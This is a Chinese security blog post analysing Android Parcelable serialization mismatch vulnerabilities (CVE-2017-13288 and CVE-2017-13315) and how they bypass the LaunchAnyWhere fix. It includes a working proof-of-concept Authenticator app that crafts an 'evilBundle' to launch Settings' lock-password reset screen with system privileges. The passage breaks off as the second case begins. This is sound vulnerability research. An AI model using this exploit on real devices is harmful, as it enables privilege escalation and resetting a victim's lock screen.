<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Bundle风水——Android序列化与反序列化不匹配漏洞详解 | MS509 Team</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Bundle风水——Android序列化与反序列化不匹配漏洞详解</h1><a id="logo" href="/.">MS509 Team</a><p class="description">Mission Studio</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Bundle风水——Android序列化与反序列化不匹配漏洞详解</h1><div class="post-meta">Jul 3, 2018<span> | </span><span class="category"><a href="/categories/移动安全/">移动安全</a></span></div><div class="clear"><div id="toc" class="toc-article"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-简介"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-背景知识"><span class="toc-number">2.</span> <span class="toc-text">0x01 背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Android-Parcelable-序列化"><span class="toc-number">2.1.</span> <span class="toc-text">Android Parcelable 序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bundle"><span class="toc-number">2.2.</span> <span class="toc-text">Bundle</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LaunchAnyWhere漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">LaunchAnyWhere漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-案例1：CVE-2017-13288"><span class="toc-number">3.</span> <span class="toc-text">0x02 案例1：CVE-2017-13288</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC"><span class="toc-number">3.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-案例2：CVE-2017-13315"><span class="toc-number">4.</span> <span class="toc-text">0x03 案例2：CVE-2017-13315</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#POC-1"><span class="toc-number">4.1.</span> <span class="toc-text">POC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-后记"><span class="toc-number">5.</span> <span class="toc-text">0x04 后记</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#参考"><span class="toc-number">5.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="post-content"><p>作者：heeeeen</p>
<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>最近几个月，Android安全公告公布了一系列系统框架层的高危提权漏洞，如下表所示。</p>
<table>
<thead>
<tr>
<th>CVE</th>
<th>Parcelable对象</th>
<th>公布时间</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/b87c968e5a41a1a09166199bf54eee12608f3900" target="_blank" rel="external">CVE-2017-0806</a></td>
<td>GateKeeperResponse</td>
<td>2017.10</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/47ebfaa2196aaf4fbeeec34f1a1c5be415cf041b%5E%21/#F0" target="_blank" rel="external">CVE-2017-13286</a></td>
<td>OutputConfiguration</td>
<td>2018.04</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/09ba8fdffd9c8d74fdc6bfb51bcebc27fc43884a" target="_blank" rel="external">CVE-2017-13287</a></td>
<td>VerifyCredentialResponse</td>
<td>2018.04</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/b796cd32a45bcc0763c50cc1a0cc8236153dcea3" target="_blank" rel="external">CVE-2017-13288</a></td>
<td>PeriodicAdvertisingReport</td>
<td>2018.04</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/5a3d2708cd2289a4882927c0e2cb0d3c21a99c02" target="_blank" rel="external">CVE-2017-13289</a></td>
<td>ParcelableRttResults</td>
<td>2018.04</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/2950276f61220e00749f8e24e0c773928fefaed8" target="_blank" rel="external">CVE-2017-13311</a></td>
<td>SparseMappingTable</td>
<td>2018.05</td>
<td></td>
</tr>
<tr>
<td><a href="https://android.googlesource.com/platform/frameworks/base/+/35bb911d4493ea94d4896cc42690cab0d4dbb78f" target="_blank" rel="external">CVE-2017-13315</a></td>
<td>DcParamObject</td>
<td>2018.05</td>
<td></td>
</tr>
</tbody>
</table>
<p>这批漏洞很有新意，似乎以前没有看到过类似的，其共同特点在于框架中Parcelable对象的写入（序列化）和读出（反序列化）不一致，比如将一个成员变量写入时为long，而读入时为int。这种错误显而易见，但是能够造成何种危害，如何证明是一个安全漏洞，却难以从补丁直观地得出结论。</p>
<p>由于漏洞原作者也没有给出Writeup，这批漏洞披上了神秘面纱。好在<a href="https://www.anquanke.com/post/id/103570" target="_blank" rel="external">漏洞预警 | Android系统序列化、反序列化不匹配漏洞</a>[1]一文给出了漏洞利用的线索——绕过launchAnywhere的补丁。结合这个线索，我们能够通过一个有漏洞的Parcelable对象，实现以Settings系统应用发送任意Intent启动Activity的能力。</p>
<h3 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h3><h4 id="Android-Parcelable-序列化"><a href="#Android-Parcelable-序列化" class="headerlink" title="Android Parcelable 序列化"></a>Android Parcelable 序列化</h4><p>Android提供了独有的Parcelable接口来实现序列化的方法，只要实现这个接口，一个类的对象就可以实现序列化并可以通过Intent或Binder传输，见下面示例中的典型用法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">public class MyParcelable implements Parcelable &#123;</div><div class="line">     private int mData;</div><div class="line"></div><div class="line">     public int describeContents() &#123;</div><div class="line">         return 0;</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     public void writeToParcel(Parcel out, int flags) &#123;</div><div class="line">         out.writeInt(mData);</div><div class="line">     &#125;</div><div class="line">     </div><div class="line">     public void readFromParcel(Parcel reply) &#123;</div><div class="line">         mData = in.readInt();</div><div class="line">     &#125;</div><div class="line"></div><div class="line">     public static final Parcelable.Creator&lt;MyParcelable&gt; CREATOR</div><div class="line">             = new Parcelable.Creator&lt;MyParcelable&gt;() &#123;</div><div class="line">         public MyParcelable createFromParcel(Parcel in) &#123;</div><div class="line">             return new MyParcelable(in);</div><div class="line">         &#125;</div><div class="line"></div><div class="line">         public MyParcelable[] newArray(int size) &#123;</div><div class="line">             return new MyParcelable[size];</div><div class="line">         &#125;</div><div class="line">     &#125;;</div><div class="line">     </div><div class="line">     private MyParcelable(Parcel in) &#123;</div><div class="line">         mData = in.readInt();</div><div class="line">     &#125;</div><div class="line"> &#125;</div></pre></td></tr></table></figure>
<p>其中，关键的writeToParcel和readFromParcel方法，分别调用Parcel类中的一系列write方法和read方法实现序列化和反序列化。</p>
<h4 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h4><p>可序列化的Parcelable对象一般不单独进行序列化传输，需要通过Bundle对象携带。 Bundle的内部实现实际是Hashmap，以Key-Value键值对的形式存储数据。例如， Android中进程间通信频繁使用的Intent对象中可携带一个Bundle对象，利用<code>putExtra(key, value)</code>方法，可以往Intent的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型信息。</p>
<p>见/frameworks/base/core/java/android/os/Parcel.java</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.</div><div class="line">    private static final int VAL_NULL = -1;</div><div class="line">    private static final int VAL_STRING = 0;</div><div class="line">    private static final int VAL_INTEGER = 1;</div><div class="line">    private static final int VAL_MAP = 2;</div><div class="line">    private static final int VAL_BUNDLE = 3;</div><div class="line">    private static final int VAL_PARCELABLE = 4;</div><div class="line">    private static final int VAL_SHORT = 5;</div><div class="line">    private static final int VAL_LONG = 6;</div><div class="line">    private static final int VAL_FLOAT = 7;</div></pre></td></tr></table></figure>
<p>对Bundle进行序列化时，依次写入携带所有数据的长度、Bundle魔数(0x4C444E42)和键值对。见BaseBundle.writeToParcelInner方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int lengthPos = parcel.dataPosition();</div><div class="line">      parcel.writeInt(-1); // dummy, will hold length</div><div class="line">      parcel.writeInt(BUNDLE_MAGIC);</div><div class="line">      int startPos = parcel.dataPosition();</div><div class="line">      parcel.writeArrayMapInternal(map);</div><div class="line">      int endPos = parcel.dataPosition();</div><div class="line">      // Backpatch length</div><div class="line">      parcel.setDataPosition(lengthPos);</div><div class="line">      int length = endPos - startPos;</div><div class="line">      parcel.writeInt(length);</div><div class="line">      parcel.setDataPosition(endPos);</div></pre></td></tr></table></figure>
<p>pacel.writeArrayMapInternal方法写入键值对，先写入Hashmap的个数，然后依次写入键和值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">   * Flatten an ArrayMap into the parcel at the current dataPosition(),</div><div class="line">   * growing dataCapacity() if needed.  The Map keys must be String objects.</div><div class="line">   */</div><div class="line">  /* package */ void writeArrayMapInternal(ArrayMap&lt;String, Object&gt; val) &#123;</div><div class="line">...</div><div class="line">      final int N = val.size();</div><div class="line">      writeInt(N);</div><div class="line">     ... </div><div class="line">      int startPos;</div><div class="line">      for (int i=0; i&lt;N; i++) &#123;</div><div class="line">          if (DEBUG_ARRAY_MAP) startPos = dataPosition();</div><div class="line">          writeString(val.keyAt(i));</div><div class="line">          writeValue(val.valueAt(i));</div><div class="line">...</div></pre></td></tr></table></figure>
<p>接着，调用writeValue时依次写入Value类型和Value本身，如果是Parcelable对象，则调用writeParcelable方法，后者会调用Parcelable对象的writeToParcel方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">public final void writeValue(Object v) &#123;</div><div class="line">        if (v == null) &#123;</div><div class="line">            writeInt(VAL_NULL);</div><div class="line">        &#125; else if (v instanceof String) &#123;</div><div class="line">            writeInt(VAL_STRING);</div><div class="line">            writeString((String) v);</div><div class="line">        &#125; else if (v instanceof Integer) &#123;</div><div class="line">            writeInt(VAL_INTEGER);</div><div class="line">            writeInt((Integer) v);</div><div class="line">        &#125; else if (v instanceof Map) &#123;</div><div class="line">            writeInt(VAL_MAP);</div><div class="line">            writeMap((Map) v);</div><div class="line">        &#125; else if (v instanceof Bundle) &#123;</div><div class="line">            // Must be before Parcelable</div><div class="line">            writeInt(VAL_BUNDLE);</div><div class="line">            writeBundle((Bundle) v);</div><div class="line">        &#125; else if (v instanceof PersistableBundle) &#123;</div><div class="line">            writeInt(VAL_PERSISTABLEBUNDLE);</div><div class="line">            writePersistableBundle((PersistableBundle) v);</div><div class="line">        &#125; else if (v instanceof Parcelable) &#123;</div><div class="line">            // IMPOTANT: cases for classes that implement Parcelable must</div><div class="line">            // come before the Parcelable case, so that their specific VAL_*</div><div class="line">            // types will be written.</div><div class="line">            writeInt(VAL_PARCELABLE);</div><div class="line">            writeParcelable((Parcelable) v, 0);</div></pre></td></tr></table></figure>
<p>反序列化过程则完全是一个对称的逆过程，依次读入Bundle携带所有数据的长度、Bundle魔数(0x4C444E42)、键和值，如果值为Parcelable对象，则调用对象的readFromParcel方法，重新构建这个对象。</p>
<p>通过下面的代码，我们还可以把序列化后的Bundle对象存为文件进行研究。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">Bundle bundle = new Bundle();</div><div class="line">bundle.putParcelable(AccountManager.KEY_INTENT, makeEvilIntent());</div><div class="line"></div><div class="line">byte[] bs = &#123;&apos;a&apos;, &apos;a&apos;,&apos;a&apos;, &apos;a&apos;&#125;;</div><div class="line">bundle.putByteArray(&quot;AAA&quot;, bs);</div><div class="line">Parcel testData = Parcel.obtain();</div><div class="line">bundle.writeToParcel(testData, 0);</div><div class="line">byte[] raw = testData.marshall();</div><div class="line">        try &#123;</div><div class="line">            FileOutputStream fos = new FileOutputStream(&quot;/sdcard/obj.pcl&quot;);</div><div class="line">            fos.write(raw);</div><div class="line">            fos.close();</div><div class="line">        &#125; catch (FileNotFoundException e)&#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125; catch (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<p>查看序列化后的Bundle数据如图<br><img src="/2018/07/03/bundle-mismatch/bundle-struct.png" alt="Bundle"></p>
<h4 id="LaunchAnyWhere漏洞"><a href="#LaunchAnyWhere漏洞" class="headerlink" title="LaunchAnyWhere漏洞"></a>LaunchAnyWhere漏洞</h4><p>Retme的<a href="http://retme.net/index.php/2014/08/20/launchAnyWhere.html" target="_blank" rel="external">这篇文章</a>[2]对LaunchAnyWhere漏洞进行了详细解析，这里我们借用文中的图，对漏洞简单进行回顾。</p>
<p><img src="/2018/07/03/bundle-mismatch/launchAnywhere.png" alt="launchAnywhere"></p>
<p>普通AppB作为Authenticator，通过Binder传递一个Bundle对象到system_server中的AccountManagerService，这个Bundle对象中包含的一个键值对<code>{KEY_INTENT:intent}</code>最终会传递到Settings系统应用，由后者调用startActivity(intent)。漏洞的关键在于，intent可以由普通AppB任意指定，那么由于Settings应用为高权限system用户（uid=1000)，因此最后的startActivity(intent)就可以启动手机上的任意Activity，包括未导出的Activity。例如，intent中指定Settings中的<code>com.android.settings.password.ChooseLockPassword</code>为目标Activity,则可以在不需要原锁屏密码的情况下重设锁屏密码。</p>
<p>Google对于这个漏洞的修补是在AccountManagerService中对AppB指定的intent进行检查，确保intent中目标Activity所属包的签名与调用AppB一致。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">      protected void checkKeyIntent(</div><div class="line">4704                int authUid,</div><div class="line">4705                Intent intent) throws SecurityException &#123;</div><div class="line">4706            long bid = Binder.clearCallingIdentity();</div><div class="line">4707            try &#123;</div><div class="line">4708                PackageManager pm = mContext.getPackageManager();</div><div class="line">4709                ResolveInfo resolveInfo = pm.resolveActivityAsUser(intent, 0, mAccounts.userId);</div><div class="line">4710                ActivityInfo targetActivityInfo = resolveInfo.activityInfo;</div><div class="line">4711                int targetUid = targetActivityInfo.applicationInfo.uid;</div><div class="line">4712                if (!isExportedSystemActivity(targetActivityInfo)</div><div class="line">4713                        &amp;&amp; (PackageManager.SIGNATURE_MATCH != pm.checkSignatures(authUid,</div><div class="line">4714                                targetUid))) &#123;</div><div class="line">4715                    String pkgName = targetActivityInfo.packageName;</div><div class="line">4716                    String activityName = targetActivityInfo.name;</div><div class="line">4717                    String tmpl = &quot;KEY_INTENT resolved to an Activity (%s) in a package (%s) that &quot;</div><div class="line">4718                            + &quot;does not share a signature with the supplying authenticator (%s).&quot;;</div><div class="line">4719                    throw new SecurityException(</div><div class="line">4720                            String.format(tmpl, activityName, pkgName, mAccountType));</div><div class="line">4721                &#125;</div></pre></td></tr></table></figure>
<p>上次过程涉及到两次跨进程的序列化数据传输。第一次，普通AppB将Bundle序列化后通过Binder传递给<code>system_server</code>，然后<code>system_server</code>通过Bundle的一系列getXXX（如getBoolean、getParcelable)函数触发反序列化，获得KEY_INTENT这个键的值——一个intent对象，进行安全检查。<br>若检查通过，调用writeBundle进行第二次序列化，然后Settings中反序列化后重新获得<code>{KEY_INTENT:intent}</code>，调用startActivity。</p>
<p>如果第二次序列化和反序列化过程不匹配，那么就有可能在<code>system_server</code>检查时Bundle中恶意的<code>{KEY_INTENT:intent}</code>不出现，而在<code>Settings</code>中出现，那么就完美地绕过了<code>checkKeyIntent</code>检查！下面我们就结合两个案例来说明其中的玄机。</p>
<h3 id="0x02-案例1：CVE-2017-13288"><a href="#0x02-案例1：CVE-2017-13288" class="headerlink" title="0x02 案例1：CVE-2017-13288"></a>0x02 案例1：CVE-2017-13288</h3><p>四月份公布的CVE-2017-13288漏洞出现在PeriodicAdvertisingReport类中，对比writeToParcel和readFromParcel函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">    public void writeToParcel(Parcel dest, int flags) &#123;</div><div class="line">        dest.writeInt(syncHandle);</div><div class="line">        dest.writeLong(txPower);</div><div class="line">        dest.writeInt(rssi);</div><div class="line">        dest.writeInt(dataStatus);</div><div class="line">        if (data != null) &#123;</div><div class="line">            dest.writeInt(1);</div><div class="line">            dest.writeByteArray(data.getBytes());</div><div class="line">        &#125; else &#123;</div><div class="line">            dest.writeInt(0);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    private void readFromParcel(Parcel in) &#123;</div><div class="line">        syncHandle = in.readInt();</div><div class="line">        txPower = in.readInt();</div><div class="line">        rssi = in.readInt();</div><div class="line">        dataStatus = in.readInt();</div><div class="line">        if (in.readInt() == 1) &#123;</div><div class="line">            data = ScanRecord.parseFromBytes(in.createByteArray());</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>在对txPower这个int类型成员变量进行操作时，写为long，读为int，因此经历一次不匹配的序列化和反序列化后txPower之后的成员变量都会错位4字节。那么如何绕过<code>checkKeyIntent</code>检查？</p>
<p>这是一项有挑战性的工作，需要在Bundle中精确布置数据。经过几天的思索，我终于想出了以下的解决方案：</p>
<p><img src="/2018/07/03/bundle-mismatch/PeriodicReport.png" alt="Bundle风水"></p>
<p>在Autherticator App中构造恶意Bundle，携带两个键值对。第一个键值对携带一个PeriodicAdvertisingReport对象，并将恶意KEY_INTENT的内容放在mData这个ByteArray类型的成员中，第二个键值对随便放点东西。由于这一次序列化需要精确控制内容，我们不希望发生不匹配，因此将PeriodicAdvertisingReport对象writeToParcel时，要和其readFromParcel对应。</p>
<p>那么在<code>system_server</code>发生的第一次反序列化中，生成PeriodicAdvertisingReport对象，syncHandle、txPower、rssi、dataStatus这些int型的数据均通过readInt读入为1，同时由于接下来的flag也为1，将恶意<code>KEY_INTENT</code>的内容读入到mData。此时，恶意KEY_INTENT不是一个单独的键值对，因此可以逃避checkIntent检查。</p>
<p>接着<code>system_server</code>将这个Bundle序列化，此时txPower这个变量使用writeLong写入Bundle，因此为占据8个字节，前4字节为1，后4字节为0。txPower后面的内容写入Bundle不变。</p>
<p>最后在<code>Settings</code>发生反序列化，txPower此时又变成了readInt，因此txPower读入为1，后面接着rssi却读入为0，发生了四字节的错位！接下来dataStatus读入为1，flag读入为1，<code>Settings</code>认为后面还有ByteArray，但读入的长度域却为1，因此把后面恶意KEY_INTENT的4字节length （ByteArray 4字节对齐）当做mData。至此，第一个键值对反序列化完毕。然后，恶意<code>KEY_INTENT</code>作为一个新的键值对就堂而皇之的出现了！最终的结果是取得以Settings应用的权限发送任意Intent，启动任意Activity的能力。</p>
<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>参考[2]编写Authenticator App，主要要点：</p>
<p>在AndroidManifest文件中设置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;service android:name=&quot;.AuthenticatorService&quot; android:exported=&quot;true&quot; &gt;</div><div class="line">           &lt;intent-filter&gt;</div><div class="line">               &lt;action</div><div class="line">                   android:name=&quot;android.accounts.AccountAuthenticator&quot; /&gt;</div><div class="line">           &lt;/intent-filter&gt;</div><div class="line">           &lt;meta-data android:name=&quot;android.accounts.AccountAuthenticator&quot;</div><div class="line">               android:resource=&quot;@xml/authenticator&quot; /&gt;</div><div class="line">       &lt;/service&gt;</div></pre></td></tr></table></figure>
<p>实现AuthenticatorService</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">public class AuthenticatorService extends Service &#123;</div><div class="line">    @Nullable</div><div class="line">    @Override</div><div class="line">    public IBinder onBind(Intent intent) &#123;</div><div class="line">        MyAuthenticator authenticator = new MyAuthenticator(this);</div><div class="line">        return authenticator.getIBinder();</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>实现Authenticator，addAccount方法中构建恶意Bundle</p>
<pre><code class="java"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAuthenticator</span> <span class="keyword">extends</span> <span class="title">AbstractAccountAuthenticator</span> </span>{
    <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"MyAuthenticator"</span>;

    <span class="keyword">private</span> Context m_context = <span class="keyword">null</span>;

    <span class="function"><span class="keyword">public</span> <span class="title">MyAuthenticator</span><span class="params">(Context context)</span> </span>{
        <span class="keyword">super</span>(context);
        m_context = context;
    }

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> Bundle <span class="title">editProperties</span><span class="params">(AccountAuthenticatorResponse response, String accountType)</span> </span>{
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }

    <span class="meta">@Override</span>
    <span class="function"><span class="keyword">public</span> Bundle <span class="title">addAccount</span><span class="params">(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options)</span> <span class="keyword">throws</span> NetworkErrorException </span>{
        Log.v(TAG, <span class="string">"addAccount"</span>);

        Bundle evilBundle = <span class="keyword">new</span> Bundle();
        Parcel bndlData = Parcel.obtain();
        Parcel pcelData = Parcel.obtain();

        <span class="comment">// Manipulate the raw data of bundle Parcel</span>
        <span class="comment">// Now we replace this right Parcel data to evil Parcel data</span>
        pcelData.writeInt(<span class="number">2</span>); <span class="comment">// number of elements in ArrayMap</span>
        <span class="comment">/*****************************************/</span>
        <span class="comment">// mismatched object</span>
        pcelData.writeString(<span class="string">"mismatch"</span>);
        pcelData.writeInt(<span class="number">4</span>); <span class="comment">// VAL_PACELABLE</span>
        pcelData.writeString(<span class="string">"android.bluetooth.le.PeriodicAdvertisingReport"</span>); <span class="comment">// name of Class Loader</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//syncHandle</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//txPower</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//rssi</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">//dataStatus</span>
        pcelData.writeInt(<span class="number">1</span>);<span class="comment">// flag for data</span>
        pcelData.writeInt(<span class="number">0x144</span>); <span class="comment">//length of KEY_INTENT:evilIntent</span>
        <span class="comment">// Evil object hide in PeriodicAdvertisingReport.mData</span>
        pcelData.writeString(AccountManager.KEY_INTENT);
        pcelData.writeInt(<span class="number">4</span>);
        pcelData.writeString(<span class="string">"android.content.Intent"</span>);<span class="comment">// name of Class Loader</span>
        pcelData.writeString(Intent.ACTION_RUN); <span class="comment">// Intent Action</span>
        Uri.writeToParcel(pcelData, <span class="keyword">null</span>); <span class="comment">// Uri is null</span>
        pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mType is null</span>
        pcelData.writeInt(<span class="number">0x10000000</span>); <span class="comment">// Flags</span>
        pcelData.writeString(<span class="keyword">null</span>); <span class="comment">// mPackage is null</span>
        pcelData.writeString(<span class="string">"com.android.settings"</span>);
        pcelData.writeString(<span class="string">"com.android.settings.password.ChooseLockPassword"</span>);
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">//mSourceBounds = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mCategories = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mSelector = null</span>
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// mClipData = null</span>
        pcelData.writeInt(-<span class="number">2</span>); <span class="comment">// mContentUserHint</span>
        pcelData.writeBundle(<span class="keyword">null</span>);
        <span class="comment">///////////////////////////////////////</span>
        pcelData.writeString(<span class="string">"Padding-Key"</span>);
        pcelData.writeInt(<span class="number">0</span>); <span class="comment">// VAL_STRING</span>
        pcelData.writeString(<span class="string">"Padding-Value"</span>); <span class="comment">//       </span>
        <span class="keyword">int</span> length  = pcelData.dataSize();
        Log.d(TAG, <span class="string">"length is "</span> + Integer.toHexString(length));
        bndlData.writeInt(length);
        bndlData.writeInt(<span class="number">0x4c444E42</span>);
        bndlData.appendFrom(pcelData, <span class="number">0</span>, length);
        bndlData.setDataPosition(<span class="number">0</span>);
        evilBundle.readFromParcel(bndlData);
        Log.d(TAG, evilBundle.toString());
        <span class="keyword">return</span> evilBundle;
   }
</code></pre>
<h3 id="0x03-案例2：CVE-2017-13315"><a href="#0x03-案例2：CVE-2017-13315" class="headerlink" title="0x03 案例2：CVE-2017-13315"></a>0x03 案例2：CVE-2017-13315</h3><p>五月份修复的CVE-2017-13315出现在DcParamObject类中，对比writeToParcel和readFromParcel函数.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">public void writeToParcel(Parcel dest, int flags) &#123;</div><div class="line">       dest.writeLong(mSubId);</div><div class="line">   &#125;</div><div class="line">   private void readFromParcel(Parcel in) &#123;</div><div class="line">       mSubId = in.readInt();</div><div class="line">   &#125;</div></pre></td></tr></table></figure>
<p>int类型的成员变量mSubId写入时为long，读出时为int，似乎Bundle中布置数据更有挑战性。但受前面将恶意KEY_INTENT置于ByteArray中启发，可以采用如下方案。</p>
